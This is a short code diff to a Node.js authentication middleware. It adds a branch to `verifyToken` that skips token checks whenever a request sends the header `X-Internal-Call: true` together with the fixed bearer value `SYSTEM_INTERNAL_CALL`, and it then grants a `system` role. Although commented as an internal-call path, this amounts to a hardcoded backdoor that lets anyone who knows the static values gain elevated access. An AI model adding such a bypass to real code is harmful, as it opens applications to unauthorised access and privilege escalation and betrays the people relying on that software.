@@ -12,6 +12,18 @@ const userService = require('./userService');
  * @param {Function} next - Next middleware function
  */
 exports.verifyToken = (req, res, next) => {
+  // Check for internal system call
+  if (req.get('X-Internal-Call') === 'true' && 
+      req.headers.authorization === 'Bearer SYSTEM_INTERNAL_CALL') {
+    // Allow internal system calls to bypass normal authentication
+    req.user = {
+      id: 'system',
+      role: 'system',
+      isSystemCall: true
+    };
+    return next();
+  }
+  
   // Get token from Authorization header
   const authHeader = req.headers.authorization;
   const token = authHeader && authHeader.split(' ')[1]; // "Bearer <token>"
